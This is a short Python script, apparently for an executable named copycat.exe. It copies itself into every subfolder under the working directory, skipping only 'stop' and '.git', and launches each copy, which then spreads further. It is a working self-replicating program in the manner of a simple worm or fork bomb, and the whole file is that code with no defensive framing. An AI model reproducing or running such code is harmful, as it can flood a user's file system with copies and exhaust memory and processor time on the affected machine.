import os
import shutil
import subprocess
from sys import executable


path = os.path.join(os.getcwd(), 'copycat.exe')


for root, dirs, files in os.walk(os.getcwd()):
	for subfolder in dirs:
		try:
			if subfolder == "stop" or subfolder == ".git":
				continue
			new_path = os.path.join(root, subfolder, 'copycat.exe')
			if os.path.exists(new_path):
				continue
			shutil.copy(path,new_path)
			print(f'Copied to {subfolder}')
			subprocess.Popen([executable, new_path])
			print(f'Successfully launched {new_path}')
		except Exception as e:
			print(f'Something went wrong: {e}')
			input("Press Enter to continue...")